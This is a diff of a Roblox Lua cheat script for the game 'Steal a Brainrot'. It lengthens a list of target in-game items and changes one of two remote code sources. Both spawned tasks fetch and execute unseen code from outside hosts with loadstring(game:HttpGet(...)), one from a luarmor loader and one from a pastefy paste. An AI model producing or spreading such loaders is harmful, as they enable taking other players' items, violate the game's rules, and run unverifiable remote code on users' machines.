@@ -182,11 +182,32 @@ getgenv().TARGET_BRAINROTS = {
     ["Serafinna Medusella"] = true,
     ["Secret Lucky Block"] = true,
     ["Fortunu and Cashuru"] = true,
-    ["Celestial Pegasus"] = true
+    ["Celestial Pegasus"] = true,
+    ["Chicleteirina Bicicleteirina"] = true,
+    ["Chill Puppy"] = true,
+    ["Luck Luck Luck Sahur"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Eid Eid Eid Sahur"] = true,
+    ["Ho Ho Ho Sahur"] = true,
+    ["25"] = true,
+    ["To to to Sahur"] = true,
+    ["La Vacca Lepre Lepreino"] = true,
+    ["Love Love Love Sahur"] = true,
+    ["Giftini Spyderini"] = true,
+    ["Trickolino"] = true,
+    ["Paradiso Axolottino"] = true,
+    ["Triplito Tralaleritos"] = true,
+    ["La Vacca Jacko Linterino"] = true,
+    ["Fishboard"] = true,
+    ["Santteo"] = true,
+    ["Job Job Job Sahur"] = true,
+    ["Frankentteo"] = true,
+    ["Pumpkini Spyderini"] = true,
+    ["Boatito Auratito"] = true
 }
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/Steal-A-Brainrot/OGBlock.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/xyCbh5Mi/raw"))()
 end)
